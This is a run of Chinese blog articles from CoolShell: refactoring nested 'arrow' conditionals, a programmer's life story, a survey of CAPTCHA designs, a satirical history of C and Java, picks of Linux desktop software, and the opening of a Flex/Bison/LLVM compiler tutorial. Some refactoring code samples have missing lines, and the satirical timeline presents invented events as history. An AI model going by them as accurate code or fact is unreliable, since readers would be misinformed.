文章有点长，我在文章最后会给出相关的思考和总结陈词，你可以跳到结尾。所谓箭头型代码，基本上来说就是下面这个图片所示的情况。那么，这样“箭头型”的代码有什么问题呢？看上去也挺好看的，有对称美。但是……关于箭头型代码的问题有如下几个：1）我的显示器不够宽，箭头型代码缩进太狠了，需要我来回拉水平滚动条，这让我在读代码的时候，相当的不舒服。2）除了宽度外还有长度，有的代码的`if-else`里的`if-else`里的`if- else`的代码太多，读到中间你都不知道中间的代码是经过了什么样的层层检查才来到这里的。总而言之， **“箭头型代码”如果嵌套太多，代码太长的话，会相当容易让维护代码的人（包括自己）迷失在代码中，因为看到最内层的代码时，你已经不知道前面的那一层一层的条件判断是什么样的，代码是怎么运行到这里的，所以，箭头型代码是非常难以维护和Debug的** 。目录* 微博上的案例 与 Guard Clauses   * 抽取成函数   * 嵌套的 if 外的代码   * 状态检查嵌套   * 延伸思考     * 检查错误     * 检查状态   * 总结#### 微博上的案例 与 Guard Clauses
OK，我们先来看一下微博上的那个示例，代码量如果再大一点，嵌套再多一点，你很容易会在条件中迷失掉（下面这个示例只是那个“大箭头”下的一个小箭头）上面这段代码，可以把条件反过来写，然后就可以把箭头型的代码解掉了，重构的代码如下所示：auto type = manager->expressionResolvings.Values()[index].type;     if ( types.Contains(type.Obj()))  continue;types.Add(type.Obj());auto group = type->GetTypeDescriptor()->GetMethodGroupByName(L"CastResult", true);     if  ( ! group ) continue;这种代码的重构方式叫 **Guard Clauses*** Martin Fowler 的 Refactoring 的网站上有相应的说明《Replace Nested Conditional with Guard Clauses》。* Coding Horror 上也有一篇文章讲了这种重构的方式 —— 《Flattening Arrow Code》
* StackOverflow 上也有相关的问题说了这种方式 —— 《Refactor nested IF statement for clarity》这里的思路其实就是， **让出错的代码先返回，前面把所有的错误判断全判断掉，然后就剩下的就是正常的代码了** 。#### 抽取成函数微博上有些人说，continue 语句破坏了阅读代码的通畅，我觉得他们一定没有好好读这里面的代码，其实，我们可以看到，所有的 if 语句都是在判断是否出错的情况，所以，在维护代码的时候，你可以完全不理会这些 if 语句，因为都是出错处理的，而剩下的代码都是正常的功能代码，反而更容易阅读了。当然，一定有不是上面代码里的这种情况，那么，不用continue ，我们还能不能重构呢？当然可以，抽成函数：auto type = manager->expressionResolvings.Values()[index].type;     if ( types.Contains(type.Obj())) return;types.Add(type.Obj());     auto group = type->GetTypeDescriptor()->GetMethodGroupByName(L"CastResult", true);     if  ( ! group ) return;
你发出现，抽成函数后，代码比之前变得更容易读和更容易维护了。不是吗？有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护。这才是函数的作用。#### 嵌套的 if 外的代码微博上还有人问，原来的代码如果在各个 if 语句后还有要执行的代码，那么应该如何重构。比如下面这样的代码。//原版     for(....) {     do_before_cond1()     if (cond1) {     do_before_cond2();     if (cond2) {     do_before_cond3();     if (cond3) {     do_something();     }     do_after_cond3();     }     do_after_cond2();     }     do_after_cond1();     }上面这段代码中的那些 `do_after_condX()` 是无论条件成功与否都要执行的。所以，我们拉平后的代码如下所示：
//重构第一版     for(....) {     do_before_cond1();     if ( !cond1 ) {     do_after_cond1();     continue     }     do_after_cond1();do_something();     }你会发现，上面的 `do_after_condX` 出现了两份。 **如果 if 语句块中的代码改变了某些`do_after_condX`依赖的状态，那么这是最终版本。**但是，如果它们之前没有依赖关系的话，根据 DRY 原则，我们就可以只保留一份，那么直接掉到 if 条件前就好了，如下所示：//重构第二版     for(....) {     do_before_cond1();     do_after_cond1();     if ( !cond1 ) continue;do_before_cond2();     do_after_cond2();     if ( !cond2 ) continue;do_before_cond3();     do_after_cond3();     if ( !cond3 ) continue;
do_something();     }此时，你会说，我靠，居然，改变了执行的顺序，把条件放到 `do_after_condX()` 后面去了。这会不会有问题啊？其实，你再分析一下之前的代码，你会发现，本来，cond1 是判断 do_before_cond1() 是否出错的，如果有成功了，才会往下执行。而 do_after_cond1() 是无论如何都要执行的。从逻辑上来说，do_after_cond1()其实和do_before_cond1()的执行结果无关，而 cond1 却和是否去执行 do_before_cond2() 相关了。如果我把断行变成下面这样，反而代码逻辑更清楚了。//重构第三版     for(....) {do_before_cond1();     do_after_cond1();if ( !cond1 ) continue;  // <-- cond1 成了是否做第二个语句块的条件     do_before_cond2();     do_after_cond2();if ( !cond2 ) continue; // <-- cond2 成了是否做第三个语句块的条件     do_before_cond3();     do_after_cond3();
if ( !cond3 ) continue; //<-- cond3 成了是否做第四个语句块的条件     do_something();}于是乎，在未来维护代码的时候，维护人一眼看上去就明白，代码在什么时候会执行到哪里。 这个时候，你会发现，把这些语句块抽成函数，代码会干净的更多，再重构一版：//重构第四版     bool do_func3() {     do_before_cond2();     do_after_cond2();     return cond3;     }// for-loop 你可以重构成这样     for (...) {     bool cond = do_func1();     if (cond) cond = do_func2();     if (cond) cond = do_func3();     if (cond) do_something();     }// for-loop 也可以重构成这样     for (...) {     if ( ! do_func1() ) continue;     if ( ! do_func2() ) continue;     if ( ! do_func3() ) continue;     do_something();     }
上面，我给出了两个版本的for-loop，你喜欢哪个？我喜欢第二个。这个时候，因为for-loop里的代码非常简单，就算你不喜欢 continue ，这样的代码阅读成本已经很低了。#### 状态检查嵌套接下来，我们再来看另一个示例。下面的代码的伪造了一个场景——把两个人拉到一个一对一的聊天室中，因为要检查双方的状态，所以，代码可能会写成了“箭头型”。重构上面的代码，我们可以先分析一下上面的代码，说明了，上面的代码就是对 PeerA 和 PeerB 的两个状态 “连上”， “未连上” 做组合 “状态” （注：实际中的状态应该比这个还要复杂，可能还会有“断开”、“错误”……等等状态）， 于是，我们可以把代码写成下面这样，合并上面的嵌套条件，对于每一种组合都做出判断。这样一来，逻辑就会非常的干净和清楚。// pA = NO, pB = NO     pA->Close();     pB->Close();     return S_ERROR;     }#### 延伸思考对于 `if-else` 语句来说，一般来说，就是检查两件事： **错误** 和 **状态** 。##### 检查错误对于检查错误来说，使用 Guard Clauses 会是一种标准解，但我们还需要注意下面几件事：
1）当然，出现错误的时候，还会出现需要释放资源的情况。你可以使用 `goto fail;` 这样的方式，但是最优雅的方式应该是C++面向对象式的 RAII 方式。2）以错误码返回是一种比较简单的方式，这种方式有很一些问题，比如，如果错误码太多，判断出错的代码会非常复杂，另外，正常的代码和错误的代码会混在一起，影响可读性。所以，在更为高组的语言中，使用 `try-catch` 异常捕捉的方式，会让代码更为易读一些。##### 检查状态对于检查状态来说，实际中一定有更为复杂的情况，比如下面几种情况：1）像TCP协议中的两端的状态变化。2）像shell各个命令的命令选项的各种组合。3）像游戏中的状态变化（一棵非常复杂的状态树）。4）像语法分析那样的状态变化。对于这些复杂的状态变化，其本上来说，你需要先定义一个状态机，或是一个子状态的组合状态的查询表，或是一个状态查询分析树。**写代码时，代码的运行中的控制状态或业务状态是会让你的代码流程变得混乱的一个重要原因，重构“箭头型”代码的一个很重要的工作就是重新梳理和描述这些状态的变迁关系** 。#### 总结好了，下面总结一下，把“箭头型”代码重构掉的几个手段如下：
1） **使用 Guard Clauses** 。 尽可能的让出错的先返回， 这样后面就会得到干净的代码。2） **把条件中的语句块抽取成函数** 。 有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护， **写出让人易读易维护的代码才是重构代码的初衷** ！3） **对于出错处理，使用try- catch异常处理和RAII机制**。返回码的出错处理有很多问题，比如：A) 返回码可以被忽略，B) 出错处理的代码和正常处理的代码混在一起，C) 造成函数接口污染，比如像atoi()这种错误码和返回值共用的糟糕的函数。4） **对于多个状态的判断和组合，如果复杂了，可以使用“组合状态表”，或是状态机加Observer的状态订阅的设计模式** 。这样的代码即解了耦，也干净简单，同样有很强的扩展性。5） **重构“箭头型”代码其实是在帮你重新梳理所有的代码和逻辑，这个过程非常值得为之付出** 。重新整思路去想尽一切办法简化代码的过程本身就可以让人成长。
（全文完）# Stay Hungry, Stay Foolish ！！作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在整个社会都在关注乔帮主的时候，我想在这里和大家分享一个真实的就在我们程序员身边的故事。和我在《如果你看不见你还能编吗？》一文里介绍的那些盲人程序员一样， **同样是Stay Hungry， Stay Foolish。但我个人更认为我今天想要给大家讲述的这个故事对于我们这些普通人更有意义一些。我真心的希望大家认真看完这个“从刷厕所到程序员”故事后，我们能从中感悟到点什么** 。因为朋友的原因，我和一个创业团队经常有些往来，通过这个团队，我认识了这个故事的主人翁——王平（@wpingsuper）。其实，很早前他在Google Reader和Buzz里follow了我，但我从没和他交流过。而他的经历我却是在上周末去看望这个创业团队的时候才听说。我问他们要了王平的电话，联系了王平，详细地了解了王平的经历，并征得他的同意，在这里给大家分享他的故事。王平是一个贵州人，03年大学毕业，体育专业，没有任何家庭背景，只能在贵州的山区里的一个中学里当体育老师，月薪150元。可能和大多数心怀梦想的年轻人一样，他并不甘心，从03年到05年间，他有好多次到北京，他觉得在大城市里有他的梦想。于是，他在04年底，05年初，他正式来到了北京，因为大学专业的问题，他无法找像大学生一样找到不错的工作，那时的他只能在北京一家很小的餐馆当清洁工，他在餐馆里洗盘子，扫地，刷厕所，一个月400元钱。
因为他的学历是这个小餐馆里学历最高的，所以，餐馆里出了什么事都会让他对去搞，所以，财务使用的电脑有了故障也让他去修，当时的他根本对电脑完全不知道是怎么一回事，但是自从接触了电脑以后他就迷上了电脑。他和我说，他这个人就是好奇心强，好动，什么都想弄一弄，所以，时间长了，弄得多了，也能为餐饮解决一些没有懂的问题，维护财务电脑就是其中之一。日子一长，虽然还是刷厕所，但是薪水也涨到了800元一个月，就连餐馆的大厨也对他说，他不属于这里，他将来一定会有前途的。当时的他还觉得不可能，笑了笑就过了。直到07年的一天，餐馆的会计对他说——“看你对电脑那么有兴趣，你应该去学习一下电脑”，这句话点醒了他。于是他在报纸上找到了一个教做网页的培训班，培训分成三期，近一年，每期需要7000元钱，好心的那个会计给了他6000元钱，让他可以在周末参加这个培训班。他和我说，这个会计是他的贵人，换钱的时候她也比较推辞，至今他也还和那位会计老师保持联系。不过好景不长，只上了一期，问题来了，餐馆周末也要上班，他无法去参加培训班了。所以，他只好辞职，去了中日友好医院，当一个送药工，就是用板车把药从这个地方送到另一个地方，全是体力活，一个月只有200元钱，不过他有了周末可以去培训班的那个时间。但是钱也花完了，上了两期都没法继续了。他和我说，当时觉得只要能活着就行，吃不饱无所谓。
此时的他虽然上了网页制作的培训班，但是因为没有实际做一个东西，所以就算是培训了也什么都不懂。这时他看到Java是一个很不错的方向，所以，想学Java。于是，08年初的时候，他用自己以前办的信用卡向银行申请了个人贷款，去报了一个需要14000多元的Java的培训班。此时，他认识了我的朋友——阎斌（@yanbin001），我这个朋友当时在这个培训公司里做讲师，讲Java。没有计算机基础的王平学习Java的难度可想而之，非常地痛苦，所以，阎斌看到他懂点网页开发，就让他别学Java了，搞搞Web的前端网页开发。而且，我这个朋友阎斌是个创业狂，所以，经常拉着王平一起去和他做互联网上的产品，并让王平去研究一些别人做的网页，于是王平从此学会做了Web前端，并开始能独立开发一些前端网页，有了实实在在的锻炼，王平他开始真正会用html + css，还会一点点js。09年4月份的时候，王平在北京西四环找到了第一份像样的工作，是一家做保健品的小公司，需要做一个公司的网站，月薪3400元。这让他得以还清了欠银行的钱。他还和我开玩笑说，他和我做的都是电子商务。当然，这对于他来说他并不满足。而我那个创业狂的朋友阎斌，又叫他出来创业，可惜创业再次未果。他只好又回去打工。
2010年4月份的时候，他到了12580做前端开发，月薪4000元左右。他说，12580的前端开发只有他一个人，今天12580的网页90%以上还是他写的，并且他还让给了我这个链接：。大家可以去看看，你能想得到这个网页是出自一个以前对电脑一窍不通在饭馆里做清洁的人之手吗？此时的王平，对Web前端开发已经是驾轻就熟，非常熟练，就连后端的工程师对他也非常佩服。 觉得他用CSS和JS用得直是相当的不错。当然，王平并不满意这份工作，在10年的11月份，他换到了现在的工作单位——百度和日本Rokuten的合资公司——乐酷天。还是老样子，他一个人负责所有的前端开发，不过这次的跳槽，他找到了一份相当不错的薪水。我对这份薪水的理解是——高级前端开发程序员。我引用我另外一个在微软和出过国并和王平一同工作过的朋友的话——“王平太猛了，CSS和JS用得巨熟无比，每次我们请他帮我们搞定一个网页效果，我们问他2天行不行，结果他2个小时就搞定了！”。好了，我的故事到这里要结束了，先让我们来看一看80后王平的样子吧。在享受工作的王平，个人博客 http://www.soboom.com我不知道你看完这个故事后是什么样的感受。我有两个感觉——
* 乔布斯说Stay Hungry, Stay Foolish。今天，当我们所有的人都在仰望神一样的乔布斯的时候，在我们津津乐道那些浪潮之巅的人物时，在听过王平对我讲述他的经历过后，我只想说，其实，我们大多数人真的不懂什么是——Stay Hungry, Stay Foolish。包括我自己在内。* 王平让还让我想到了电影《命运规划局》里的最后一句话，大概是这样说的——“ **大多数人按照我们所安排的路线生活，害怕探索其它路线，但也会有一些人，他们并不满足于被设定的生活轨迹，冲破我们设置的重重阻碍，意识到自由意志是天赐之物的人，才明白只有在奋力抗争后才知道如何善用之** 。”（全文完）_**————更新 2011/10/20 15:00————**_有些人觉得这篇文章是给培训公司做广告或是炒作。有些人觉得几百元钱在北京生存并不可能。我可以理解你们的怀疑，但这些言论让我有些无语，我只希望你们能在做些调查后，再做这样的结论。 **你可以看到，王平在第一个培训公司没有学到什么，在第二个培训公司也没有学到什么，而是在和我的朋友阎斌去尝试创业时才学到了很多。呼唤这些人的阅读智商啊** 。这个世界有时候并不是像我们所想像的那样，在北京，几百元一个月的人并不少，上大学也好，去培训公司也好，这都不重要，重要的是我们想改变自己的那种心态和积极。而我只希望王平的经历能给大家带来人生的一些感触。
# 各式各样的验证码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn还记得以前那篇《超强验证码》？其实这个世界变态的验证码还有很多，下面是一个列表向像展示了各种稀奇古怪的验证码。不过本文并不单单只是收集这验证码，前面的比较恶搞，后面的会向你展示什么是有accessibility验证码。目录* 完全看不清楚的   * 看得清但令人抓狂的   * 数学公式的   * 智力题   * 你的审美水平正常吗？   * 你懂盲文吗？   * ASCII图片式   * 怎么验证一个人是否成年   * 3D验证码   * reCaptcha   * Facebook的人脸识别验证码   * 微软的ASIRRA   * DISTCHA   * MotionCAPTCHA   * siteHelp的DragCapCha   * jQuery 验证码插件     * jQuery s3Capcha 插件     * Ajax Fancy Captcha     * wCaptcha   * Picatcha   * yoCaptcha   * W3C的建议#### 完全看不清楚的
这是人类的字符吗？图案中的字母是什么？这也够奇葩的了。#### 看得清但令人抓狂的####数学公式的如果你填对了，你是人类吗？#### 智力题#### 你的审美水平正常吗？#### 你懂盲文吗？#### ASCII图片式############ 怎么验证一个人是否成年#### 3D验证码通个这个脚本自动生成的：!http://ocr-research.org.ua/tb/getimage.php5######## reCaptcha相信大家都知道reCAPTCHA下了一盘很大的棋，它让你在输验证码的时候还帮着还原书籍中那些很难被OCR识别的单词。其有两组验证码，一组是可以被电脑识别的，另一组是不能被电脑识别的（也就是让人来帮电脑识别的），如果你第一组答对了，就会被 认为是人工操作，于是你回答的第二组就会成为人肉OCR。它最近又将增加一项新功能：显示Google地图上的街景地址和名称。这样从地图上的街景中提取街道地址和名称以及交通标志等数据，以完善Google地图上的信息。#### Facebook的人脸识别验证码你觉得有创意吗?#### 微软的ASIRRA#### DISTCHA通过像iPhone/iPad开启时滑动的样式来验证。
#### MotionCAPTCHA用鼠标来画个画。#### siteHelp的DragCapCha为下面的字母排个序吧#### jQuery 验证码插件##### jQuery s3Capcha 插件##### Ajax Fancy Captcha和上面那个不一样，这个需要拖动##### wCaptcha和上面的很相似。#### Picatcha挑出所有的计算器#### yoCaptcha广告式的验证码#### W3C的建议W3C的这篇文章（）表达了传统的验证码图片的Inaccessibility的问题，而且一些验证码都很容易被破解。如：* aiCaptcha: Using AI to beat CAPTCHA and post comment spam   * Breaking CAPTCHAs Without Using OCR   * PWNtcha – CAPTCHA decoderW3C也给了一些解决方案：* 一些逻辑题或是智力题。   * 声音输出，为了照顾残疾人。 Spam-bot tests flunk the blind   * 限制帐号的操作次数。   * 使用现有的Spam检测机制。如：酷壳（Coolshell.cn）的评论没有验证码，垃圾评论完全靠Akismet 插件过滤。
建议你移步去看看这篇文章。（全文完）# C语言的演变史作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn1972 – C语言的先驱——B语言，被贝尔实验室开发。B语言是一个很快速的，容易维护的，而且对于从系统到应用开发是很好用的。设计这门语言的整个团队被马上解雇了，因为他们干了一件和电话通讯不相干的事情。最后这个项目转给了 Dennis Ritchie。他把这个语言变得不容易理解，很难维护，而且，只能用于系统方面的编程。而且，他还设计了一个指针系统，保让每一个程序都超过500行，并可以使用操作系统的指针。1982 – 大家发现有97% 的C程序调用产生了“缓冲区溢出”问题。于是，C 程序员们开始意识到，就算是不必要也必需要初始化变量。然而，强制性的变量初始化这个明智的决定，很难影响了当时已经写成了的97%的C程序，所以结果什么也没有发生。1984 – 操作系统出现了“错误指针”的问题数量开始戏剧性地增涨。1985 – 一系列的让C语言有面向对象能力的解决方法出现了，一个叫“C With Classes”正准备商业化。然而，大家觉得名字“C With Classes”太清楚和容易被理解了，所以，最终的商业版本叫做—— C++。
1986 – C语言成为最流行的语句，其被很多业界分析师推荐于业务应用。他们向全世界宣称——由C语言写成的应用将可以运行在很多不同的平台上的，是跨平台的。目前看来，这些众多的分析者在当时有可能是因为某种迷幻而导致其大脑被所蛊惑了。1988 – 业界的这些分析家们因为“摇头丸”吃完了。所以，在他们的幻觉过去以后，他们注意到，使用C语言来开发业务应用会增加5倍以上的开发时间，并且程序也不具备可移植性。他们开始停止向大众推荐使用C语言来开发业务应用了，只能很少一部服用可卡因的人开始转向推荐大众使用C++语言写业务应用程序，他们说，“那是面向对象的，所以，代码是很容易重用的”。1990 – 在这个时候，所有的C编译器都转到了C++编译器上。但是，因为大多数的C++程序员并没有使用C++中那些面向对象的语言特性。也就是说，在实际上来说，那种浮肿的代码结构加上操作系统指针的代码被一种叫面向对象的编译器编译。1990 – 在雇佣了一些转向“吸胶毒”的分析师后，Sun决定要创造一种叫Oak的语言，这种语言主要用于电视的机顶盒。因为当时几乎所有的程序员的DNA中都有C语的基因，所以，这个语言向C和C++中大量地借鉴了很多它们的语法和编程思路。然而，机顶盒上没有操作系统，也就不存在指针，所以，他们把指针从这门语言里给去掉了。
1994 – Sun公司里的某个人意识到为一个机顶盒开发一个语言是多么愚蠢的事情。于是，这个语言更名为Java，并且为其注入了“Internet”的特征，从而让其成为一个真正可以被移植的语言。其市场营销上相当成功，而那时有3%的业内人士开始明白什么是Internet，同时，那些精神不正常的分析师们还在不停地嗑药并向大众鼓吹他们的神话——“跨平台移植性”。1995 – Sun 向业界的分析师们提供了免费蘑菇迷魂汤，导致那些分析师在喝下汤后，马上开始写下“Java是一门未来的可移植的和Ineternet高度可集成的语言”。1996 中 – 17,468,972 篇文章出现，描述了Java是怎么一门未来的语言。这也是Java Applet开始进入Web页的时代。1996 末– 程序员开始使用Java applet创建他们的Web页面，然后他们开始因为挫折和沮丧开始集体自杀。此时，那些分析师开始增大蘑菇迷魂汤的剂量。1997 – 因为接受了产生幻觉分析师的建议，Corel 决定重写他们的应用，包括 WordPerfect，当然，是用Java写的。最终的结果是，这是迄今为止比“打字机”还慢的字处理软件。
1998 – 在意识到applet已在快速枯萎，Sun又一次的重新配置了Java，这次，他们叫Severlet，这是一个服务器的程序语言。这个设计在抄袭了Microsoft Transaction Server ，并且，他们说服所有人这个设计是他们创造的。1999 – 业内那些喝多了的分析师们用一种咆哮的方式向大众介绍了Java 2 Enterprise Edition 。 21,499,512 文章被写出来。但是，实际上并没有人使用，因为J2EE太不成熟，而又太贵了。2000 – J2EE 最终还是运转起来了（一点点）。而且，所有的Java卖主们开始准备向其砸钱，与此同时，Microsoft 宣布了.NET，这是一个包括了所有的J2EE功能但没那么贵的产品。实际上来说， Microsoft 决定让Windows的用户免费使用.NET 。 Scott McNealy 很愤怒，其对Microsoft开展了相关的法律诉讼。.NET 包括了最新的C家族语言，叫C#，发音是“C-pound”，继承最家族的传统，使用着一个愚蠢的名字。2001 – Microsoft 的市场部意识到，在市面上没有人谈论他们的产品，他们找了其中一个程序员一起吃中饭，才发现，他们把C#叫做 “C sharp”。
2002 – C# 成为 Microsoft .NET的一部分。 C++ 的开发者在 Microsoft 平台上为 “managed code”而欢呼雀跃，也就是说，他们最终得到了一个内存自动管理的功能，这一功能正是1991年的Visual Basic 及1995年的Java所创建的 。_copyright (C) 1996-2006 by Billy S. Hollis, originally posted on dotnetmasters.com 13 January 2006_文章：来源__# 最完美的Linux桌面软件作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**!ubuntu-logo1**   下面是关于Linux桌面环境下，目前为止最完美的部分。之所以说他们完美，是因为他们不但很养眼，而且也使用最好的多媒体技术，有最好的可用性。在某些方面，他们甚至超过了Windows和Mac- OS。## **基础**Debian 或是 Ubuntu。这两个分发包是目前使用最广泛的Linux桌面操作系统的分发包了。## **软件包管理器**
因为我们使用debian……所以apt 必然是软件包管理器中最不错的一个。## **!gnome2桌面环境**这可能是最难的一个了。KDE4 是出色的，相当的出色。QT, 基于Gnome建造，也非常出色。而在稳重方面， Gnome 桌面则是桌面中更为出色的。而且，许多的应用基本上来说都是基于 GTK 开发的，而GTK则是基于GNOME桌面环境的。所以，我们在这里选择 Gnome 作为最完美的图形桌面。对于KDE，只能非常抱歉了。## **快捷任务条（Dock）**也许你并不喜欢docks，不过其的确可以帮你更方便地使用图形界面。CairoDock吗？ 当然，非常不错。那么 AWN 呢？ 也不错。它们都有不同的很不错的功能。但是，因为我们选择了Gnome桌面，所以Gnome-Do 在这其中则是最完美的。!docky1## **字体**Linux默认的字体必需要被改变。你可以从 Blambot获得一些相当不错的字体。!jupiteroneioss3**风格/ 图标**这里有一些 怪异的但令人惊叹 的风格和图标可以装典你的桌面。你可以挑选几个来美化你的桌面，的确很不错哦。在这样漂亮的桌面和背景下工作，你的心情都会变得轻松起来。
## **应用商店（Application Store）**你是不是早已听说过这个东西啦？我们需要重要Linux发行包可以被简单的拼装起来，并且包含一个“应用商店”（一个不错的桌面应用，用户可以容易地购买商业的软件和服务）。看看这个吧 Click N Run。的确存在，基于Ubuntu。## **Office 套件**这可能是最难的一个了。新面世的KOffice 的确是非常不错的。但是 OpenOffice 可能更好一些，必竟年头也最长，Bug和性能各方面应该都比较好。## 音频/ 视频框架让我们站在高山之上大喊这句话： GStreamer 是王中之王。!screenshot-miro## **视频播放器**有一个令人惊讶的播放器叫 Miro （原来叫做 Democracy Player）如果你的Linux安装了它，那么你的Linux就会变成一个最Cool的桌面系统，你可以相当轻松地找到并查看在线的视频。## **多媒体中心**Windows 有一个Windows Media Center. OS X 有Front Row).那么Linux下有什么？目前来说…… 几乎所有的Linux发行版没有包含这类应用。
不过，我们依然有一些选择。我的选择是 Moovida （正式的：Elisa） 它是有商业资助的，使用GStreamer。它比Apple的 Front Row更为强大。而且，其看上去很不错。!banshee-slide-dap## 音频播放器Banshee，看看它到底有多简单。是的，是的，我知道。 Amarok 相当的不错。而且 Rhythmbox 也很不错.不过 Banshee 更好一些，因为它被设计成为让用户有更多的选择可以去管理他们的音乐库。因为，当你的音频文件多起来时，你会发现，你是多么需要这样一个强大的管理功能的播放器啊。## **音频编辑器**目前看下来，在音频编辑方面，Linux并不是很优秀，不过我们依然可以看到Ardour 这样令人惊叹的软件，即使其功能还不是那么的强大。不过你可以试试Jokosher。这是一个很简单的但比较平常的音频编辑器。!400px-capture-pitivi_v01301## **视频编辑器**Pitivi. 商业资助的。一个绝对超前的。可以用于Gstreamer 的。如果让其和 iMovie来比较的话，Pitivi依然是超前的… 不过，如果我们关注于其它关键应用，那么，这两个编辑器就难分高下了。
## **图片管理器**F-Spot. 不多说了，你试试就知道了。!yofrankie10## 游戏几乎所有的Linux发行版都会带有一堆游戏，当然这些游戏几乎没人去玩。下面是几个非常不错的游戏，值得你去试试。第一个是 Yo Frankie! 这个游戏可以展示你的Linux在游戏方面比起别的操作系统来说也是非常有能力的。而Hedgewars 游戏则相当搞笑的。如果你和几个有一些联网的话，这个游戏也是非常搞笑的。Frozen Bubble 可能是另一个有些意思的游戏。你可以去试试。!empathy-chat-theme## **聊天**这个领域绝对不是 Pidgin. Pidgin 已经出局了。如果是 Empathy，它有更好一些的设计。那么，音频和视频聊天呢？Ekiga吗？ 不是.Skype吗？你说什么？Skype没有开源啊。是的，我们知道，不过Skype是其中表现最为出色的。而且，其用户群是非常大的。包括和电话互联，以及便宜的国际长途。## **浏览器**Firefox，不是吗？不用多解释了吧。## **电子邮件**Evolution 并不仅仅是漂亮。它也可以和Gnome桌面集成。## **开发环境**
Windows 程序员有 Visual Studio. Mac 程序员有 XCode.当然，Linux下也有很多。挑选一个很不错的开发环境，我们当然需要有一些标准的规则。有一个“标准”是，开发工具应该是和操作系统紧密结合的，而且需要有一堆可用的工具，这样可以避免程序员再重新发明轮子。!ss-steticLinux下有太多这样的开发工具了。 QT Creator 可能是其中最好的，但是它只能在 Gnome 桌面环境下使用。那么，最容易得到和有丰富功能的IDE又是什么呢？MonoDevelop.是的， 我知道有人说过 “Mono is bad cuz of teh Microsoft.” 不过，如果你确实地相信这句话，那么你自然也就不是一个专业的程序员，而且，你可能在很多地方都在焦虑着一些事情。MonoDevelop 是一个很不错的IDE开发工具。希望你能试试。文章：来源# 使用Flex Bison 和LLVM编写自己的编译器作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**使用Flex Bison 和 LLVM编写你自己的编译器**   原文出处：http://gnuu.org/2009/09/18/writing-your-own-toy- compiler
##  1、介绍我总是对编译器和语言非常感兴趣，但是兴趣并不会让你走的更远。大量的编译器的设计概念可以搞的任何一个程序员迷失在这些概念之中。不用说，我也曾今尝试过，但是并没有取得太大的成功，我以前的尝试都停留在语义分析阶段。本文的灵感主要来源于我最近一次的尝试，并且在这一次中我取得一点成就。幸运的是，最近的几年，我参加了一些项目，这些项目给了我在建立编译器上很多有用的经验和观点。另外一件事是，我非常幸运得到LLVM的帮助。对于这个工具，我不知道改怎么去形容它，但是他给我的这个编译器的确带来非常大的帮助。### 1.1、你为什么要阅读本文你也许想看看我正在做的事情，但是更有可能的是，你也是和我一样对编译器和语言非常感兴趣，并且也可能遇到了一些在探索的过程中遇到了一些难题，你可能正打算解决这些难题，但是却没有发现好的资源。本文的目标就是提供这些资源，并以一种手把手的方式教你从头到尾的去创建一个具有基本功能的语言编译器。在本文，我不会去解释一些编译器基本理论，所以你要在开始本文前去了解什么是BNF语法，什么是抽象语法树数据结构 AST data structure，什么是基础编译器流水线 complier pipline。就是说，我会把本文描述的尽量简单。本文的目的就是以一种简单易懂的方式来介绍相关编译器资源的方式来帮助那些从来没有编译器经验的人。
### 1.2、达到的成果如果你根据文章内容一步步来，你将会得到一个能定义函数，调用函数，定义变量，给变量赋值执行基本数学操作的语言。这门语言支持两种基本类型，double和integer类型。还有一些功能还未实现，因此，你可以通过自己去实现这些功能得到你满意的功能并且能为你理解编写一个编译器提供不少的帮助。### 1.3 问题解答#### 1.3.1 我需要了解什么样的语言我们使用的工具是基于C/C++的。LLVM是基于C++的，我们的这个语言也基于C++，因为C++具有很多面向对象的优点和可以被重用的STL。此外对于C，Lex和Bison都具有那些初看起来令人迷惑的语法，但是我将尽可能的去解释他。我们需要处理的语法非常小，最多就100行，因此它是比较容易理解的。#### 1.3.2 很复杂吗？是或否，这里面有很多的东西你需要了解，甚至多的让人感觉到害怕，但是老实说，其实这些都非常简单，我们同样会使用很多工具分解这些层次的复杂性，并使得这些内容可管理。#### 1.3.3 完成它需要多长时间我们将要完成的编译器花了我三天的时间。但是如果你按“follow me”的方式来完成这个编译器的话，你将会花费更少的时间。如果要全部理解这里面的内容可能会花去稍微长一点的时间，但是你至少应该在一个下午就将整个编译器运行起来。
好，如果你已经准备好，我们开始吧。## 2、准备开始### 2.1 构成编译器的最基本的要素一个编译器是由一组有三个到四个组件(还有一些子组件)构成，数据以管道的方式从一个组件输入并流向下一个组件。在我们这个编译器中，可能会用到一些稍微不同的工具。下面这个图展示了我们构造一个编译器的步骤，和每个步骤中将使用的工具。!Compiler Pipeline从上图你可以看到在Linking这一步是灰掉的。我们的语言将不支持编译器的连接(很多的语言都不支持编译器的连接)。在文法分析阶段，我们将使用开源工具Lex，即如今的Flex，文法分析一般都伴随者语法分析，我们使用的语法分析工具将会是Yacc，或者说是Bison，最后一旦语义分析完成，我们将遍历我们的抽象语法树，并生成我们的”bytecode 字节码”，或”机器码 matchine code”。做这一步，我们将使用LLVM，它能生成快速字节码，我们将使用LLVM的JIT(Just In Tinme)来在我们的机器上编译执行它总结一下，步骤如下：1. **文法分析用 _Flex_** :将数据分隔成一个个的标记token (标示符identifiers，关键字keywords，数字numbers, 中括号brackets, 大括号braces, 等等etc.)    2. **语法分析用 _Bison_** : 在分析标记的时候生成抽象语法树. Bison 将会做掉几乎所有的这些工作, 我们定义好我们的抽象语法树就OK了.    3. **组装用 _LLVM_** : 这里我们将遍历我们的抽象语法树，并未每一个节点生成字节/机器码。 这听起来似乎很疯狂，但是这几乎就是 _最简单的_ 一步了.
